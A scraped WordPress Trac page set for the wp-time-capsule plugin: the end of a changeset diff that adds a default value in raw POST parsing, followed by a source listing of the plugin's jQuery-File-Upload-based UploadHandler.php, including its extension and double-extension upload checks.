  | 79 | 79 | $this->define( 'WPTC\_DATABASE\_VERSION', '17.0' ); |
  | 80 | 80 | } |
* ## [wp-time-capsule/trunk/wptc-cron-functions.php](/changeset/3153289/wp-time-capsule/trunk/wptc-cron-functions.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/wptc-cron-functions.php")

  | [r3116762](/browser/wp-time-capsule/trunk/wptc-cron-functions.php?rev=3116762#L164 "Show revision 3116762 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/wptc-cron-functions.php?rev=3153289#L164 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 164 | 164 | && strpos($HTTP\_RAW\_POST\_DATA\_LOCAL, 'IWP\_JSON\_PREFIX') !== false ) { |
  | 165 | 165 | $request\_data\_array = explode('\_IWP\_JSON\_PREFIX\_', $HTTP\_RAW\_POST\_DATA\_LOCAL); |
  | 166 |  | $request\_raw\_data = $request\_data\_array[1]; |
  |  | 166 | $request\_raw\_data = $request\_data\_array[1] ?? ''; |
  | 167 | 167 | $data = trim(base64\_decode($request\_raw\_data)); |
  | 168 | 168 | if ($data){ |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=3153289)
* [Zip Archive](?format=zip&new=3153289)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from plugins.trac.wordpress.org_d464ad60_20250114_220901.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fwp-time-capsule%2Ftrunk%2Fwp-tcapsule-bridge%2Fupload%2Fphp%2FUploadHandler.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Revision](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php?rev=3153289 "Revision 3153289")
* Next Revision →
* [Blame](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php)

---

# [source:](/browser?order=name "Go to repository root") [wp-time-capsule](/browser/wp-time-capsule?order=name "View wp-time-capsule")/[trunk](/browser/wp-time-capsule/trunk?order=name "View trunk")/[wp-tcapsule-bridge](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge?order=name "View wp-tcapsule-bridge")/[upload](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload?order=name "View upload")/[php](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php?order=name "View php")/[UploadHandler.php](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php?order=name "View UploadHandler.php")

View diff against:

View revision:

| [Last change](/changeset/3188325/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php "View differences") on this file was [3188325](/changeset/3188325/ "View changeset 3188325"), checked in by WPTimeCapsule, [2 months ago](/timeline?from=2024-11-14T05%3A58%3A22Z&precision=second "See timeline at 11/14/2024 05:58:22 AM") |
| --- |
| release 1.22.23 |
| **File size:** 55.0 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) | /\* |
| [3](#L3) | \* jQuery File Upload Plugin PHP Class |
| [4](#L4) | \* https://github.com/blueimp/jQuery-File-Upload |
| [5](#L5) | \* |
| [6](#L6) | \* Copyright 2010, Sebastian Tschan |
| [7](#L7) | \* https://blueimp.net |
| [8](#L8) | \* |
| [9](#L9) | \* Licensed under the MIT license: |
| [10](#L10) | \* https://opensource.org/licenses/MIT |
| [11](#L11) | \*/ |
| [12](#L12) |  |
| [13](#L13) | #[AllowDynamicProperties] |
| [14](#L14) | class UploadHandler |
| [15](#L15) | { |
| [16](#L16) |  |
| [17](#L17) | protected $options; |
| [18](#L18) |  |
| [19](#L19) | // PHP File Upload error message codes: |
| [20](#L20) | // http://php.net/manual/en/features.file-upload.errors.php |
| [21](#L21) | protected $error\_messages = array( |
| [22](#L22) | 1 => 'The uploaded file exceeds the upload\_max\_filesize directive in php.ini', |
| [23](#L23) | 2 => 'The uploaded file exceeds the MAX\_FILE\_SIZE directive that was specified in the HTML form', |
| [24](#L24) | 3 => 'The uploaded file was only partially uploaded', |
| [25](#L25) | 4 => 'No file was uploaded', |
| [26](#L26) | 6 => 'Missing a temporary folder', |
| [27](#L27) | 7 => 'Failed to write file to disk', |
| [28](#L28) | 8 => 'A PHP extension stopped the file upload', |
| [29](#L29) | 'post\_max\_size' => 'The uploaded file exceeds the post\_max\_size directive in php.ini', |
| [30](#L30) | 'max\_file\_size' => 'File is too big', |
| [31](#L31) | 'min\_file\_size' => 'File is too small', |
| [32](#L32) | 'accept\_file\_types' => 'Filetype not allowed', |
| [33](#L33) | 'max\_number\_of\_files' => 'Maximum number of files exceeded', |
| [34](#L34) | 'max\_width' => 'Image exceeds maximum width', |
| [35](#L35) | 'min\_width' => 'Image requires a minimum width', |
| [36](#L36) | 'max\_height' => 'Image exceeds maximum height', |
| [37](#L37) | 'min\_height' => 'Image requires a minimum height', |
| [38](#L38) | 'abort' => 'File upload aborted', |
| [39](#L39) | 'image\_resize' => 'Failed to resize image' |
| [40](#L40) | ); |
| [41](#L41) |  |
| [42](#L42) | protected $image\_objects = array(); |
| [43](#L43) |  |
| [44](#L44) | public function \_\_construct($options = null, $initialize = true, $error\_messages = null) { |
| [45](#L45) | ini\_set('display\_errors', false); |
| [46](#L46) |  |
| [47](#L47) | $this->response = array(); |
| [48](#L48) | $this->options = array( |
| [49](#L49) | 'script\_url' => $this->get\_full\_url().'/'.$this->basename($this->get\_server\_var('SCRIPT\_NAME')), |
| [50](#L50) | 'upload\_dir' => dirname($this->get\_server\_var('SCRIPT\_FILENAME')).'/files/', |
| [51](#L51) | 'upload\_url' => $this->get\_full\_url().'/files/', |
| [52](#L52) | 'input\_stream' => 'php://input', |
| [53](#L53) | 'user\_dirs' => false, |
| [54](#L54) | 'mkdir\_mode' => 0755, |
| [55](#L55) | 'param\_name' => 'files', |
| [56](#L56) | // Set the following option to 'POST', if your server does not support |
| [57](#L57) | // DELETE requests. This is a parameter sent to the client: |
| [58](#L58) | 'delete\_type' => 'DELETE', |
| [59](#L59) | 'access\_control\_allow\_origin' => '\*', |
| [60](#L60) | 'access\_control\_allow\_credentials' => false, |
| [61](#L61) | 'access\_control\_allow\_methods' => array( |
| [62](#L62) | 'OPTIONS', |
| [63](#L63) | 'HEAD', |
| [64](#L64) | 'GET', |
| [65](#L65) | 'POST', |
| [66](#L66) | 'PUT', |
| [67](#L67) | 'PATCH', |
| [68](#L68) | 'DELETE' |
| [69](#L69) | ), |
| [70](#L70) | 'access\_control\_allow\_headers' => array( |
| [71](#L71) | 'Content-Type', |
| [72](#L72) | 'Content-Range', |
| [73](#L73) | 'Content-Disposition' |
| [74](#L74) | ), |
| [75](#L75) | // By default, allow redirects to the referer protocol+host: |
| [76](#L76) | 'redirect\_allow\_target' => '/^'.preg\_quote( |
| [77](#L77) | parse\_url($this->get\_server\_var('HTTP\_REFERER'), PHP\_URL\_SCHEME) |
| [78](#L78) | .'://' |
| [79](#L79) | .parse\_url($this->get\_server\_var('HTTP\_REFERER'), PHP\_URL\_HOST) |
| [80](#L80) | .'/', // Trailing slash to not match subdomains by mistake |
| [81](#L81) | '/' // preg\_quote delimiter param |
| [82](#L82) | ).'/', |
| [83](#L83) | // Enable to provide file downloads via GET requests to the PHP script: |
| [84](#L84) | //     1. Set to 1 to download files via readfile method through PHP |
| [85](#L85) | //     2. Set to 2 to send a X-Sendfile header for lighttpd/Apache |
| [86](#L86) | //     3. Set to 3 to send a X-Accel-Redirect header for nginx |
| [87](#L87) | // If set to 2 or 3, adjust the upload\_url option to the base path of |
| [88](#L88) | // the redirect parameter, e.g. '/files/'. |
| [89](#L89) | 'download\_via\_php' => false, |
| [90](#L90) | // Read files in chunks to avoid memory limits when download\_via\_php |
| [91](#L91) | // is enabled, set to 0 to disable chunked reading of files: |
| [92](#L92) | 'readfile\_chunk\_size' => 1 \* 1024 \* 1024, // 1 MiB |
| [93](#L93) | // Defines which files can be displayed inline when downloaded: |
| [94](#L94) | 'inline\_file\_types' => '/\.(gif|jpe?g|png)$/i', |
| [95](#L95) | // Defines which files (based on their names) are accepted for upload: |
| [96](#L96) | 'accept\_file\_types' => array('application/gzip', 'application/sql'), |
| [97](#L97) | // The php.ini settings upload\_max\_filesize and post\_max\_size |
| [98](#L98) | // take precedence over the following max\_file\_size setting: |
| [99](#L99) | 'max\_file\_size' => null, |
| [100](#L100) | 'min\_file\_size' => 1, |
| [101](#L101) | // The maximum number of files for the upload directory: |
| [102](#L102) | 'max\_number\_of\_files' => null, |
| [103](#L103) | // Defines which files are handled as image files: |
| [104](#L104) | 'image\_file\_types' => '/\.(gif|jpe?g|png)$/i', |
| [105](#L105) | // Use exif\_imagetype on all files to correct file extensions: |
| [106](#L106) | 'correct\_image\_extensions' => false, |
| [107](#L107) | // Image resolution restrictions: |
| [108](#L108) | 'max\_width' => null, |
| [109](#L109) | 'max\_height' => null, |
| [110](#L110) | 'min\_width' => 1, |
| [111](#L111) | 'min\_height' => 1, |
| [112](#L112) | // Set the following option to false to enable resumable uploads: |
| [113](#L113) | 'discard\_aborted\_uploads' => true, |
| [114](#L114) | // Set to 0 to use the GD library to scale and orient images, |
| [115](#L115) | // set to 1 to use imagick (if installed, falls back to GD), |
| [116](#L116) | // set to 2 to use the ImageMagick convert binary directly: |
| [117](#L117) | 'image\_library' => 1, |
| [118](#L118) | // Uncomment the following to define an array of resource limits |
| [119](#L119) | // for imagick: |
| [120](#L120) | /\* |
| [121](#L121) | 'imagick\_resource\_limits' => array( |
| [122](#L122) | imagick::RESOURCETYPE\_MAP => 32, |
| [123](#L123) | imagick::RESOURCETYPE\_MEMORY => 32 |
| [124](#L124) | ), |
| [125](#L125) | \*/ |
| [126](#L126) | // Command or path for to the ImageMagick convert binary: |
| [127](#L127) | 'convert\_bin' => 'convert', |
| [128](#L128) | // Uncomment the following to add parameters in front of each |
| [129](#L129) | // ImageMagick convert call (the limit constraints seem only |
| [130](#L130) | // to have an effect if put in front): |
| [131](#L131) | /\* |
| [132](#L132) | 'convert\_params' => '-limit memory 32MiB -limit map 32MiB', |
| [133](#L133) | \*/ |
| [134](#L134) | // Command or path for to the ImageMagick identify binary: |
| [135](#L135) | 'identify\_bin' => 'identify', |
| [136](#L136) | 'image\_versions' => array( |
| [137](#L137) | // The empty image version key defines options for the original image: |
| [138](#L138) | // Keep in mind that these options are inherited by all other image versions! |
| [139](#L139) | '' => array( |
| [140](#L140) | // Automatically rotate images based on EXIF meta data: |
| [141](#L141) | 'auto\_orient' => true |
| [142](#L142) | ), |
| [143](#L143) | // Uncomment the following to create medium sized images: |
| [144](#L144) | /\* |
| [145](#L145) | 'medium' => array( |
| [146](#L146) | 'max\_width' => 800, |
| [147](#L147) | 'max\_height' => 600 |
| [148](#L148) | ), |
| [149](#L149) | \*/ |
| [150](#L150) | 'thumbnail' => array( |
| [151](#L151) | // Uncomment the following to use a defined directory for the thumbnails |
| [152](#L152) | // instead of a subdirectory based on the version identifier. |
| [153](#L153) | // Make sure that this directory doesn't allow execution of files if you |
| [154](#L154) | // don't pose any restrictions on the type of uploaded files, e.g. by |
| [155](#L155) | // copying the .htaccess file from the files directory for Apache: |
| [156](#L156) | //'upload\_dir' => dirname($this->get\_server\_var('SCRIPT\_FILENAME')).'/thumb/', |
| [157](#L157) | //'upload\_url' => $this->get\_full\_url().'/thumb/', |
| [158](#L158) | // Uncomment the following to force the max |
| [159](#L159) | // dimensions and e.g. create square thumbnails: |
| [160](#L160) | //'crop' => true, |
| [161](#L161) | 'max\_width' => 80, |
| [162](#L162) | 'max\_height' => 80 |
| [163](#L163) | ) |
| [164](#L164) | ), |
| [165](#L165) | 'print\_response' => true |
| [166](#L166) | ); |
| [167](#L167) | if ($options) { |
| [168](#L168) | $this->options = $options + $this->options; |
| [169](#L169) | } |
| [170](#L170) | if ($error\_messages) { |
| [171](#L171) | $this->error\_messages = $error\_messages + $this->error\_messages; |
| [172](#L172) | } |
| [173](#L173) |  |
| [174](#L174) | if ($initialize) { |
| [175](#L175) | $this->initialize(); |
| [176](#L176) | } |
| [177](#L177) | } |
| [178](#L178) |  |
| [179](#L179) | protected function initialize() { |
| [180](#L180) |  |
| [181](#L181) | switch ($this->get\_server\_var('REQUEST\_METHOD')) { |
| [182](#L182) | case 'OPTIONS': |
| [183](#L183) | case 'HEAD': |
| [184](#L184) | $this->head(); |
| [185](#L185) | break; |
| [186](#L186) | case 'GET': |
| [187](#L187) | $this->get($this->options['print\_response']); |
| [188](#L188) | break; |
| [189](#L189) | case 'PATCH': |
| [190](#L190) | case 'PUT': |
| [191](#L191) | case 'POST': |
| [192](#L192) | $this->post($this->options['print\_response']); |
| [193](#L193) | break; |
| [194](#L194) | case 'DELETE': |
| [195](#L195) | $this->delete($this->options['print\_response']); |
| [196](#L196) | break; |
| [197](#L197) | default: |
| [198](#L198) | $this->header('HTTP/1.1 405 Method Not Allowed'); |
| [199](#L199) | } |
| [200](#L200) | } |
| [201](#L201) |  |
| [202](#L202) | protected function get\_full\_url() { |
| [203](#L203) | $https = !empty($\_SERVER['HTTPS']) && strcasecmp($\_SERVER['HTTPS'], 'on') === 0 || |
| [204](#L204) | !empty($\_SERVER['HTTP\_X\_FORWARDED\_PROTO']) && |
| [205](#L205) | strcasecmp($\_SERVER['HTTP\_X\_FORWARDED\_PROTO'], 'https') === 0; |
| [206](#L206) | return |
| [207](#L207) | ($https ? 'https://' : 'http://'). |
| [208](#L208) | (!empty($\_SERVER['REMOTE\_USER']) ? $\_SERVER['REMOTE\_USER'].'@' : ''). |
| [209](#L209) | (isset($\_SERVER['HTTP\_HOST']) ? $\_SERVER['HTTP\_HOST'] : ($\_SERVER['SERVER\_NAME']. |
| [210](#L210) | ($https && $\_SERVER['SERVER\_PORT'] === 443 || |
| [211](#L211) | $\_SERVER['SERVER\_PORT'] === 80 ? '' : ':'.$\_SERVER['SERVER\_PORT']))). |
| [212](#L212) | substr($\_SERVER['SCRIPT\_NAME'],0, strrpos($\_SERVER['SCRIPT\_NAME'], '/')); |
| [213](#L213) | } |
| [214](#L214) |  |
| [215](#L215) | protected function get\_user\_id() { |
| [216](#L216) | @session\_start(); |
| [217](#L217) | return session\_id(); |
| [218](#L218) | } |
| [219](#L219) |  |
| [220](#L220) | protected function get\_user\_path() { |
| [221](#L221) | if ($this->options['user\_dirs']) { |
| [222](#L222) | return $this->get\_user\_id().'/'; |
| [223](#L223) | } |
| [224](#L224) | return ''; |
| [225](#L225) | } |
| [226](#L226) |  |
| [227](#L227) | protected function get\_upload\_path($file\_name = null, $version = null) { |
| [228](#L228) | $file\_name = $file\_name ? $file\_name : ''; |
| [229](#L229) | if (empty($version)) { |
| [230](#L230) | $version\_path = ''; |
| [231](#L231) | } else { |
| [232](#L232) | $version\_dir = @$this->options['image\_versions'][$version]['upload\_dir']; |
| [233](#L233) | if ($version\_dir) { |
| [234](#L234) | return $version\_dir.$this->get\_user\_path().$file\_name; |
| [235](#L235) | } |
| [236](#L236) | $version\_path = $version.'/'; |
| [237](#L237) | } |
| [238](#L238) | return $this->options['upload\_dir'].$this->get\_user\_path() |
| [239](#L239) | .$version\_path.$file\_name; |
| [240](#L240) | } |
| [241](#L241) |  |
| [242](#L242) | protected function get\_query\_separator($url) { |
| [243](#L243) | return strpos($url, '?') === false ? '?' : '&'; |
| [244](#L244) | } |
| [245](#L245) |  |
| [246](#L246) | protected function get\_download\_url($file\_name, $version = null, $direct = false) { |
| [247](#L247) | if (!$direct && $this->options['download\_via\_php']) { |
| [248](#L248) | $url = $this->options['script\_url'] |
| [249](#L249) | .$this->get\_query\_separator($this->options['script\_url']) |
| [250](#L250) | .$this->get\_singular\_param\_name() |
| [251](#L251) | .'='.rawurlencode($file\_name); |
| [252](#L252) | if ($version) { |
| [253](#L253) | $url .= '&version='.rawurlencode($version); |
| [254](#L254) | } |
| [255](#L255) | return $url.'&download=1'; |
| [256](#L256) | } |
| [257](#L257) | if (empty($version)) { |
| [258](#L258) | $version\_path = ''; |
| [259](#L259) | } else { |
| [260](#L260) | $version\_url = @$this->options['image\_versions'][$version]['upload\_url']; |
| [261](#L261) | if ($version\_url) { |
| [262](#L262) | return $version\_url.$this->get\_user\_path().rawurlencode($file\_name); |
| [263](#L263) | } |
| [264](#L264) | $version\_path = rawurlencode($version).'/'; |
| [265](#L265) | } |
| [266](#L266) | return $this->options['upload\_url'].$this->get\_user\_path() |
| [267](#L267) | .$version\_path.rawurlencode($file\_name); |
| [268](#L268) | } |
| [269](#L269) |  |
| [270](#L270) | protected function set\_additional\_file\_properties($file) { |
| [271](#L271) | $file->deleteUrl = $this->options['script\_url'] |
| [272](#L272) | .$this->get\_query\_separator($this->options['script\_url']) |
| [273](#L273) | .$this->get\_singular\_param\_name() |
| [274](#L274) | .'='.rawurlencode($file->name); |
| [275](#L275) | $file->deleteType = $this->options['delete\_type']; |
| [276](#L276) | if ($file->deleteType !== 'DELETE') { |
| [277](#L277) | $file->deleteUrl .= '&\_method=DELETE'; |
| [278](#L278) | } |
| [279](#L279) | if ($this->options['access\_control\_allow\_credentials']) { |
| [280](#L280) | $file->deleteWithCredentials = true; |
| [281](#L281) | } |
| [282](#L282) | } |
| [283](#L283) |  |
| [284](#L284) | // Fix for overflowing signed 32 bit integers, |
| [285](#L285) | // works for sizes up to 2^32-1 bytes (4 GiB - 1): |
| [286](#L286) | protected function fix\_integer\_overflow($size) { |
| [287](#L287) | if ($size < 0) { |
| [288](#L288) | $size += 2.0 \* (PHP\_INT\_MAX + 1); |
| [289](#L289) | } |
| [290](#L290) | return $size; |
| [291](#L291) | } |
| [292](#L292) |  |
| [293](#L293) | protected function get\_file\_size($file\_path, $clear\_stat\_cache = false) { |
| [294](#L294) | if ($clear\_stat\_cache) { |
| [295](#L295) | if (version\_compare(PHP\_VERSION, '5.3.0') >= 0) { |
| [296](#L296) | clearstatcache(true, $file\_path); |
| [297](#L297) | } else { |
| [298](#L298) | clearstatcache(); |
| [299](#L299) | } |
| [300](#L300) | } |
| [301](#L301) | return $this->fix\_integer\_overflow(filesize($file\_path)); |
| [302](#L302) | } |
| [303](#L303) |  |
| [304](#L304) | protected function is\_valid\_file\_object($file\_name) { |
| [305](#L305) | $file\_path = $this->get\_upload\_path($file\_name); |
| [306](#L306) | if (is\_file($file\_path) && $file\_name[0] !== '.') { |
| [307](#L307) | return true; |
| [308](#L308) | } |
| [309](#L309) | return false; |
| [310](#L310) | } |
| [311](#L311) |  |
| [312](#L312) | protected function get\_file\_object($file\_name) { |
| [313](#L313) | if ($this->is\_valid\_file\_object($file\_name)) { |
| [314](#L314) | $file = new \stdClass(); |
| [315](#L315) | $file->name = $file\_name; |
| [316](#L316) | $file->size = $this->get\_file\_size( |
| [317](#L317) | $this->get\_upload\_path($file\_name) |
| [318](#L318) | ); |
| [319](#L319) | $file->url = $this->get\_download\_url($file->name); |
| [320](#L320) | foreach ($this->options['image\_versions'] as $version => $options) { |
| [321](#L321) | if (!empty($version)) { |
| [322](#L322) | if (is\_file($this->get\_upload\_path($file\_name, $version))) { |
| [323](#L323) | $file->{$version.'Url'} = $this->get\_download\_url( |
| [324](#L324) | $file->name, |
| [325](#L325) | $version |
| [326](#L326) | ); |
| [327](#L327) | } |
| [328](#L328) | } |
| [329](#L329) | } |
| [330](#L330) | $this->set\_additional\_file\_properties($file); |
| [331](#L331) | return $file; |
| [332](#L332) | } |
| [333](#L333) | return null; |
| [334](#L334) | } |
| [335](#L335) |  |
| [336](#L336) | protected function get\_file\_objects($iteration\_method = 'get\_file\_object') { |
| [337](#L337) | $upload\_dir = $this->get\_upload\_path(); |
| [338](#L338) | if (!is\_dir($upload\_dir)) { |
| [339](#L339) | return array(); |
| [340](#L340) | } |
| [341](#L341) | return array\_values(array\_filter(array\_map( |
| [342](#L342) | array($this, $iteration\_method), |
| [343](#L343) | scandir($upload\_dir) |
| [344](#L344) | ))); |
| [345](#L345) | } |
| [346](#L346) |  |
| [347](#L347) | protected function count\_file\_objects() { |
| [348](#L348) | return count($this->get\_file\_objects('is\_valid\_file\_object')); |
| [349](#L349) | } |
| [350](#L350) |  |
| [351](#L351) | protected function get\_error\_message($error) { |
| [352](#L352) | return isset($this->error\_messages[$error]) ? |
| [353](#L353) | $this->error\_messages[$error] : $error; |
| [354](#L354) | } |
| [355](#L355) |  |
| [356](#L356) | public function get\_config\_bytes($val) { |
| [357](#L357) | $val = trim($val); |
| [358](#L358) | $last = strtolower($val[strlen($val)-1]); |
| [359](#L359) | $val = (int)$val; |
| [360](#L360) | switch ($last) { |
| [361](#L361) | case 'g': |
| [362](#L362) | $val \*= 1024; |
| [363](#L363) | case 'm': |
| [364](#L364) | $val \*= 1024; |
| [365](#L365) | case 'k': |
| [366](#L366) | $val \*= 1024; |
| [367](#L367) | } |
| [368](#L368) | return $this->fix\_integer\_overflow($val); |
| [369](#L369) | } |
| [370](#L370) |  |
| [371](#L371) | protected function has\_double\_extension($filename) { |
| [372](#L372) | $pattern = '/\.\w+\.\w+$/i'; |
| [373](#L373) |  |
| [374](#L374) | return preg\_match($pattern, $filename) === 1; |
| [375](#L375) | } |
| [376](#L376) |  |
| [377](#L377) | protected function is\_executable\_file($filename) { |
| [378](#L378) | $pattern = '/\.(exe|bat|cmd|sh|msi|scr|com|cpl|dll|php|rb|pl|py|cgi|asp|aspx)/i'; |
| [379](#L379) |  |
| [380](#L380) | return preg\_match($pattern, $filename) === 1; |
| [381](#L381) | } |
| [382](#L382) | protected function validate($uploaded\_file, $file, $error, $index) { |
| [383](#L383) | if ($error) { |
| [384](#L384) | $file->error = $this->get\_error\_message($error); |
| [385](#L385) | return false; |
| [386](#L386) | } |
| [387](#L387) | $content\_length = $this->fix\_integer\_overflow( |
| [388](#L388) | (int)$this->get\_server\_var('CONTENT\_LENGTH') |
| [389](#L389) | ); |
| [390](#L390) | $post\_max\_size = $this->get\_config\_bytes(ini\_get('post\_max\_size')); |
| [391](#L391) | if ($post\_max\_size && ($content\_length > $post\_max\_size)) { |
| [392](#L392) | $file->error = $this->get\_error\_message('post\_max\_size'); |
| [393](#L393) | return false; |
| [394](#L394) | } |
| [395](#L395) |  |
| [396](#L396) | $mimes = array( |
| [397](#L397) | 'sql'    => 'application/sql', |
| [398](#L398) | 'gz'     => 'application/gzip', |
| [399](#L399) | 'crypt'  => 'application/octet-stream', |
| [400](#L400) | ); |
| [401](#L401) |  |
| [402](#L402) | $allowed\_extesions = ['sql', 'gz', 'crypt']; |
| [403](#L403) | if($this->has\_double\_extension($file->name) && $this->is\_executable\_file($file->name)){ |
| [404](#L404) | $file->error = 'File is executable with double extension.'; |
| [405](#L405) |  |
| [406](#L406) | return false; |
| [407](#L407) | } |
| [408](#L408) |  |
| [409](#L409) | $file\_extension = pathinfo($file->name, PATHINFO\_EXTENSION); |
| [410](#L410) |  |
| [411](#L411) | if(!in\_array($file\_extension, $allowed\_extesions)){ |
| [412](#L412) | $file->error = $this->get\_error\_message('accept\_file\_types'); |
| [413](#L413) | return false; |
| [414](#L414) | } |
| [415](#L415) |  |
| [416](#L416) | if ($uploaded\_file && is\_uploaded\_file($uploaded\_file)) { |
| [417](#L417) | $file\_size = $this->get\_file\_size($uploaded\_file); |
| [418](#L418) | } else { |
| [419](#L419) | $file\_size = $content\_length; |
| [420](#L420) | } |
| [421](#L421) | if ($this->options['max\_file\_size'] && ( |
| [422](#L422) | $file\_size > $this->options['max\_file\_size'] || |
| [423](#L423) | $file->size > $this->options['max\_file\_size']) |
| [424](#L424) | ) { |
| [425](#L425) | $file->error = $this->get\_error\_message('max\_file\_size'); |
| [426](#L426) | return false; |
| [427](#L427) | } |
| [428](#L428) | if ($this->options['min\_file\_size'] && |
| [429](#L429) | $file\_size < $this->options['min\_file\_size']) { |
| [430](#L430) | $file->error = $this->get\_error\_message('min\_file\_size'); |
| [431](#L431) | return false; |
| [432](#L432) | } |
| [433](#L433) | if (is\_int($this->options['max\_number\_of\_files']) && |
| [434](#L434) | ($this->count\_file\_objects() >= $this->options['max\_number\_of\_files']) && |
| [435](#L435) | // Ignore additional chunks of existing files: |
| [436](#L436) | !is\_file($this->get\_upload\_path($file->name))) { |
| [437](#L437) | $file->error = $this->get\_error\_message('max\_number\_of\_files'); |
| [438](#L438) | return false; |
| [439](#L439) | } |
| [440](#L440) | $max\_width = @$this->options['max\_width']; |
| [441](#L441) | $max\_height = @$this->options['max\_height']; |
| [442](#L442) | $min\_width = @$this->options['min\_width']; |
| [443](#L443) | $min\_height = @$this->options['min\_height']; |
| [444](#L444) | if (($max\_width || $max\_height || $min\_width || $min\_height) |
| [445](#L445) | && preg\_match($this->options['image\_file\_types'], $file->name)) { |
| [446](#L446) | list($img\_width, $img\_height) = $this->get\_image\_size($uploaded\_file); |
| [447](#L447) |  |
| [448](#L448) | // If we are auto rotating the image by default, do the checks on |
| [449](#L449) | // the correct orientation |
| [450](#L450) | if ( |
| [451](#L451) | @$this->options['image\_versions']['']['auto\_orient'] && |
| [452](#L452) | function\_exists('exif\_read\_data') && |
| [453](#L453) | ($exif = @exif\_read\_data($uploaded\_file)) && |
| [454](#L454) | (((int) @$exif['Orientation']) >= 5) |
| [455](#L455) | ) { |
| [456](#L456) | $tmp = $img\_width; |
| [457](#L457) | $img\_width = $img\_height; |
| [458](#L458) | $img\_height = $tmp; |
| [459](#L459) | unset($tmp); |
| [460](#L460) | } |
| [461](#L461) |  |
| [462](#L462) | } |
| [463](#L463) | if (!empty($img\_width)) { |
| [464](#L464) | if ($max\_width && $img\_width > $max\_width) { |
| [465](#L465) | $file->error = $this->get\_error\_message('max\_width'); |
| [466](#L466) | return false; |
| [467](#L467) | } |
| [468](#L468) | if ($max\_height && $img\_height > $max\_height) { |
| [469](#L469) | $file->error = $this->get\_error\_message('max\_height'); |
| [470](#L470) | return false; |
| [471](#L471) | } |
| [472](#L472) | if ($min\_width && $img\_width < $min\_width) { |
| [473](#L473) | $file->error = $this->get\_error\_message('min\_width'); |
| [474](#L474) | return false; |
| [475](#L475) | } |
| [476](#L476) | if ($min\_height && $img\_height < $min\_height) { |
| [477](#L477) | $file->error = $this->get\_error\_message('min\_height'); |
| [478](#L478) | return false; |
| [479](#L479) | } |
| [480](#L480) | } |
| [481](#L481) | return true; |
| [482](#L482) | } |
| [483](#L483) |  |
| [484](#L484) | protected function upcount\_name\_callback($matches) { |
| [485](#L485) | $index = isset($matches[1]) ? ((int)$matches[1]) + 1 : 1; |
| [486](#L486) | $ext = isset($matches[2]) ? $matches[2] : ''; |
| [487](#L487) | return ' ('.$index.')'.$ext; |
| [488](#L488) | } |
| [489](#L489) |  |
| [490](#L490) | protected function upcount\_name($name) { |
